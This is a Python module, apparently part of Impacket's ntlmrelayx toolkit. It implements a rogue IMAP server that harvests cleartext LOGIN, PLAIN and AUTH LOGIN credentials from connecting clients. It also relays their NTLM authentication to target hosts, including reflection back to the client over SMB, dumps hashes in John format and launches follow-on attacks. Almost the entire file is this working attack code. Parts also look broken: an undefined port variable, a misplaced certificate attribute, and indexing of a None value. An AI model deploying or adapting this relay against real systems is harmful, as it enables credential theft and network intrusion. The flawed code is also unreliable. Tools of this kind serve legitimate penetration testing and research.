from threading import Thread
import socketserver

from impacket import LOG, ntlm
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.utils import get_address
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.ssl import generate_self_signed_certificate, sni_callback
from OpenSSL import SSL, crypto
import socket
import re
import base64
from typing import List


class IMAPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, server_address, RequestHandlerClass, config: NTLMRelayxConfig):
        self.config = config
        self.self_signed_certificate = False
        if self.config.imap_server_cert and self.config.imap_server_key:
            try:
                self.server_cert = crypto.load_certificate(crypto.FILETYPE_PEM, self.config.imap_server_cert)
                self.server_key = crypto.load_privatekey(crypto.FILETYPE_PEM, self.config.imap_server_key)
            except Exception as e:
                LOG.error(f"(IMAP): Unable to load cert chain from files: {e}")
                exit(1)
        else:
            LOG.warning("(IMAP) Generating self-signed certificate")
            server_cert, server_key = generate_self_signed_certificate()
            self.server_cert = crypto.load_certificate(crypto.FILETYPE_PEM, server_cert)
            self.server_key = crypto.load_privatekey(crypto.FILETYPE_PEM, server_key)
            self.self_signed_certificate = True
        self.daemon_threads = True
        self.address_family, self.server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
        socketserver.TCPServer.allow_reuse_address = True
        socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

class IMAPHandler(socketserver.BaseRequestHandler):
    def __init__(self,request: socket.socket, client_address, server):
        self.server = server
        self.challengeMessage = None
        self.client = None
        self.machineAccount = None
        self.machineHashes = None
        self.domainIp = None
        self.authUser = None
        self.tls_enabled = False
        
        if self.server.config.target is None:
            # Reflection mode, defaults to SMB at the target, for now
            self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
        self.target = self.server.config.target.getTarget()
        if self.target is None:
            LOG.info("(IMAP): Received connection from %s, but there are no more targets left!" % client_address[0])
            return

        LOG.info("(IMAP): Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
        super().__init__(request, client_address, server)
    def upgrade_to_tls(self):
        ''' Upgrading connection to TOS using certificate '''
        try:
                            # Create SSL context
            context = SSL.Context(SSL.SSLv23_METHOD)
            context.set_options(SSL.OP_NO_SSLv2 | SSL.OP_NO_SSLv3)
            context.use_certificate(self.server.server_cert)
            context.use_privatekey(self.server.server_key)
            if self.self_signed_certificate:
                context.sni_callback = sni_callback
            connection = SSL.Connection(context, self.request)
            connection.set_accept_state()
            connection.do_handshake()
            self.tls_enabled = True
            
            # Wrap socket
            self.request = connection

            LOG.info(f"(IMAP): Successfully upgraded to TLS from {self.client_address[0]}")
            return True
        except Exception as e:
            LOG.error(f"(IMAP): TLS upgrade failed: {e}")
            return False
    
    def send_capability(self, tag="*"):
        """Send CAPABILITY response with STARTTLS if not already in TLS"""
        if self.tls_enabled:
            # After STARTTLS, don't advertise it again
            self.request.send(b"* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN AUTH=LOGIN AUTH=NTLM\r\n")
        else:
            # Before STARTTLS, advertise it
            capability = "* CAPABILITY IMAP4 IMAP4rev1 AUTH=PLAIN AUTH=LOGIN AUTH=NTLM STARTTLS\r\n"
            self.request.send(capability.encode('latin-1'))
        
        if tag != "*":
            self.request.send(("%s OK CAPABILITY completed.\r\n" % tag).encode('latin-1'))
    
    def extract_tag(self, data):
        """Extract IMAP command tag (e.g., 'A001' from 'A001 LOGIN ...')"""
        try:
            parts = data.decode('latin-1', errors='ignore').split()
            if parts:
                return parts[0]
        except:
            pass
        return "A001"
    
    def handle_login(self, data):
        """
        Handle LOGIN command
        Format: TAG LOGIN username password
        Credentials can be quoted or unquoted
        """
        try:
            RequestTag = self.extract_tag(data)
            
            # Decode the data
            data_str = data.decode('latin-1', errors='ignore').strip()
            
            # Remove tag and LOGIN command
            # Pattern: TAG LOGIN credentials
            login_match = re.search(r'LOGIN\s+(.+)', data_str, re.IGNORECASE)
            if not login_match:
                response = "%s BAD LOGIN command syntax error\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return False
            
            credentials_part = login_match.group(1).strip()
            
            # Parse credentials - can be quoted or unquoted
            username, password = self.parse_credentials(credentials_part)
            
            if username and password:
                LOG.info(f"(IMAP): Captured AUTH LOGIN credentials from {self.client_address[0]}. {username} : {password}")
                # Send success but then close
                response = "%s BAD LOGIN credentials - I was used it (Impacket)\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return True
            else:
                # Invalid credentials format
                response = "%s BAD LOGIN credentials format error\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return False
        
        except Exception as e:
            return False

    def parse_credentials(self, creds_str):
        """
        Parse username and password from LOGIN command
        Supports: "user" "pass", user pass, {5}user {8}password (literal strings)
        """
        try:
            # Method 1: Quoted strings "user" "pass"
            quoted_match = re.findall(r'"([^"]*)"', creds_str)
            if len(quoted_match) >= 2:
                return quoted_match[0], quoted_match[1]
            
            # Method 2: Space-separated (unquoted)
            parts = creds_str.split()
            if len(parts) >= 2:
                # Remove any curly brace literals {5}
                user = re.sub(r'^\{\d+\}', '', parts[0])
                passwd = re.sub(r'^\{\d+\}', '', parts[1])
                return user, passwd
            return None, None
        except:
            return None, None

    def handle_authenticate_plain(self, data):
        """Handle AUTHENTICATE PLAIN command - can be single-line or multi-line"""
        try:
            RequestTag = self.extract_tag(data)
            data_str = data.decode('latin-1', errors='ignore').strip()
            plain_match = re.search(r'AUTHENTICATE\s+PLAIN\s+(.+)', data_str, re.IGNORECASE)
            
            if plain_match:
                b64_creds = plain_match.group(1).strip()
            else:
                response = "+\r\n"
                self.request.send(response.encode('latin-1'))
                cred_data = self.request.recv(1024)
                if not cred_data:
                    return False
                b64_creds = cred_data.decode('latin-1', errors='ignore').strip()
            
            try:
                decoded = base64.b64decode(b64_creds).decode('latin-1', errors='ignore')
                parts = decoded.split('\x00')
                
                if len(parts) >= 3:
                    username = parts[1]
                    password = parts[2]
                elif len(parts) >= 2:
                    username = parts[0]
                    password = parts[1]
                else:
                    raise ValueError("Invalid PLAIN format")
                
                if username and password:
                    LOG.info(f"IMAP): Captured AUTH PLAIN credentials from {self.client_address[0]}. {username} : {password}")
                    
                    response = "%s NO AUTHENTICATE captured by Impacket. Thank you!\r\n" % RequestTag
                    self.request.send(response.encode('latin-1'))
                    return True
            
            except Exception as e:
                response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return False
        
        except Exception as e:
            return False

    def handle_authenticate_login(self, data):
        """Handle AUTHENTICATE LOGIN command - prompts for username, then password"""
        try:
            RequestTag = self.extract_tag(data)
            
            response = "+ " + base64.b64encode(b"Username:").decode('latin-1') + "\r\n"
            self.request.send(response.encode('latin-1'))
            
            user_data = self.request.recv(1024)
            if not user_data:
                return False
            
            username_b64 = user_data.decode('latin-1', errors='ignore').strip()
            username = base64.b64decode(username_b64).decode('latin-1', errors='ignore')
            
            response = "+ " + base64.b64encode(b"Password:").decode('latin-1') + "\r\n"
            self.request.send(response.encode('latin-1'))
            
            pass_data = self.request.recv(1024)
            if not pass_data:
                return False
            
            password_b64 = pass_data.decode('latin-1', errors='ignore').strip()
            password = base64.b64decode(password_b64).decode('latin-1', errors='ignore')
            
            if username and password:
                LOG.info(f"(IMAP): Captured AUTH LOGIN credentials from {self.client_address[0]}. {username}: {password}")
                response = "%s OK AUTHENTICATE completed\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return True
            else:
                response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return False
        
        except Exception as e:
            return False
    
    def handle_authenticate_ntlm(self, data):
        ''' Handle AUTHENTICATE NTLM command '''
        try:
            RequestTag = self.extract_tag(data)
            response = "+\r\n"
            self.request.send(response.encode('latin-1'))
            type1_data = self.request.recv(2048)
            if not type1_data:
                return False
            negotiate_msg = base64.b64decode(type1_data.decode('latin-1', errors="ignore").strip())
            # Verify NTLMSSP signature
            if negotiate_msg[0:8] != b'NTLMSSP\x00':
                return False
            
            # Relay to gain challenge
            challenge = self.do_ntlm_negotiate(negotiate_msg)
            if challenge is None:
                LOG.error(f"(IMAP) Error when relay NTLM Type 2 message to client ")
                return False
            
            response = "+ %s\r\n" % base64.b64encode(challenge.getData()).decode('latin-1')
            self.request.send(response.encode('latin-1'))

            authenticate_message = self.request.recv(4096)
            if not authenticate_message:
                return False

            auth_decoded = authenticate_message.decode('latin-1', errors='ignore').strip()
        
            if auth_decoded == '*' or auth_decoded == '':
                LOG.error(f'(IMAP) Client cancelled NTLM authentication')
                response = "%s NO AUTHENTICATE cancelled\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return False
            
            if not all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\r\n' for c in auth_decoded):
                response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return False
            
            try:
                auth_data = base64.b64decode(auth_decoded)
            except Exception as e:
                response = "%s NO AUTHENTICATE failed\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
                return False
            
            authenticateMessage = self.do_ntlm_auth(auth_data)
            if authenticateMessage is None:
                # Authentication failed
                self.request.send(("%s NO AUTHENTICATE failed\r\n" % RequestTag).encode('latin-1'))
                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                    LOG.error("(IMAP): Authenticating against %s://%s as %s\\%s FAILED" % (
                        self.target.scheme, self.target.netloc,
                        authenticateMessage['domain_name'].decode('utf-16le'),
                        authenticateMessage['user_name'].decode('utf-16le')))
                else:
                    LOG.error("(IMAP): Authenticating against %s://%s as %s\\%s FAILED" % (
                        self.target.scheme, self.target.netloc,
                        authenticateMessage['domain_name'].decode('ascii'),
                        authenticateMessage['user_name'].decode('ascii')))
                return False
            # relay worked, do whatever we want
            self.request.send(("%s NO AUTHENTICATE relayed by Impacket\r\n" % RequestTag).encode('latin-1'))
            self.client.setClientId()
            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                LOG.info("(IMAP): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                    authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'),
                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
            else:
                LOG.info("(IMAP): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                    authenticateMessage['domain_name'].decode('ascii'), authenticateMessage['user_name'].decode('ascii'),
                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
            
            ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'],
                                                authenticateMessage['lanman'], authenticateMessage['ntlm'])
            self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

            if self.server.config.dumpHashes is True:
                LOG.info("(IMAP): %s" % ntlm_hash_data['hash_string'])

            if self.server.config.outputFile is not None:
                writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                        self.server.config.outputFile)

            self.server.config.target.registerTarget(self.target, True, self.authUser)

            self.do_attack()
            return True
        except Exception as e:
            LOG.error(f"Error when handle NTLM Auth: {e}")
            return False
            
    def do_ntlm_negotiate(self, token: bytes) -> bytes | None:
        self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
        # If connection failed -> return False
        if not self.client.initConnection():
            return None
        self.challengeMessage = self.client.sendNegotiate(token)
        if self.server.config.remove_target:
            av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
            del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
            self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
            self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
            self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
        
        if self.challengeMessage is False:
            return None
        return self.challengeMessage
    
    def do_ntlm_auth(self, token: bytes) -> bytes | None:
        self.authenticateMessage = ntlm.NTLMAuthChallengeResponse()
        self.authenticateMessage.fromString(token)
        self.authUser = self.authenticateMessage.getUserString()
        if self.authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
            clientResponse, errorCode = self.client.sendAuth(token)
        else:
            # Anonymous login send STATUS_ACCESS_DENIED so we force the client to send his credentials, except when coming from localhost
            errorCode = STATUS_ACCESS_DENIED
        if errorCode == STATUS_SUCCESS:
            return self.authenticateMessage
        return None
    
    def do_attack(self):
        # Check if SOCKS is enabled and if we support the target scheme
        if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
            # Pass all the data to the socksplugins proxy
            activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                    self.authUser, self.client, self.client.sessionData))
            return

        # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
        if self.target.scheme.upper() in self.server.config.attacks:
            # We have an attack.. go for it
            clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
                                                                            self.authUser, self.target, self.client)
            clientThread.start()
        else:
            LOG.error('(IMAP): No attack configured for %s' % self.target.scheme.upper())
    
    def handle(self):
        try:
            # Send greeting
            self.request.send("* OK Impacket IMAP4 Server Ready\r\n".encode('latin-1'))
            
            # Main loop to handle multiple commands
            while True:
                data = self.request.recv(1024)
                if not data:
                    break
                
                # Handle CAPABILITY command
                if b'CAPABILITY' in data.upper():
                    RequestTag = self.extract_tag(data)
                    self.send_capability(RequestTag)
                    continue
                
                # Handle STARTTLS command
                if b'STARTTLS' in data.upper():
                    RequestTag = self.extract_tag(data)
                    
                    if self.tls_enabled:
                        # Already in TLS
                        response = "%s BAD STARTTLS already in TLS\r\n" % RequestTag
                        self.request.send(response.encode('latin-1'))
                        continue
                    
                    # Send OK response before upgrading
                    response = "%s OK Begin TLS negotiation now\r\n" % RequestTag
                    self.request.send(response.encode('latin-1'))
                    
                    # Upgrade to TLS
                    if not self.upgrade_to_tls():
                        # TLS upgrade failed, close connection
                        break
                    
                    # Continue handling commands over TLS
                    continue
                
                # Handle LOGIN command
                if b'LOGIN' in data.upper():
                    if self.handle_login(data):
                        break
                    continue
                
                # Handle AUTHENTICATE PLAIN
                if b'AUTHENTICATE PLAIN' in data.upper():
                    if self.handle_authenticate_plain(data):
                        break
                    continue
                
                # Handle AUTHENTICATE LOGIN
                if b'AUTHENTICATE LOGIN' in data.upper():
                    if self.handle_authenticate_login(data):
                        break
                    continue
                
                # Handle AUTHENTICATE NTLM
                if b'AUTHENTICATE NTLM' in data.upper():
                    if self.handle_authenticate_ntlm(data):
                        break
                    continue
                
                # Handle LOGOUT
                if b'LOGOUT' in data.upper():
                    RequestTag = self.extract_tag(data)
                    response = "* BYE Impacket IMAP4 server logging out\r\n"
                    response += "%s OK LOGOUT completed\r\n" % RequestTag
                    self.request.send(response.encode('latin-1'))
                    break
                
                # Unknown command - send error
                RequestTag = self.extract_tag(data)
                response = "%s BAD Command not recognized\r\n" % RequestTag
                self.request.send(response.encode('latin-1'))
        
        except Exception as e:
            LOG.error(f"(IMAP): Error when handle command: {e.with_traceback()}")
            pass


class IMAPRelayServer(Thread):    
    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):

        if self.config.listeningPort:
            imapport = self.config.listeningPort
        else:
            impaport = 143
            
        LOG.info("Setting up IMAP Server on port " + str(imapport))            

        # changed to read from the interfaceIP set in the configuration
        self.server = IMAPServer((self.config.interfaceIp, imapport), IMAPHandler, self.config)

        try:
             self.server.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down IMAP Server')
        self.server.server_close()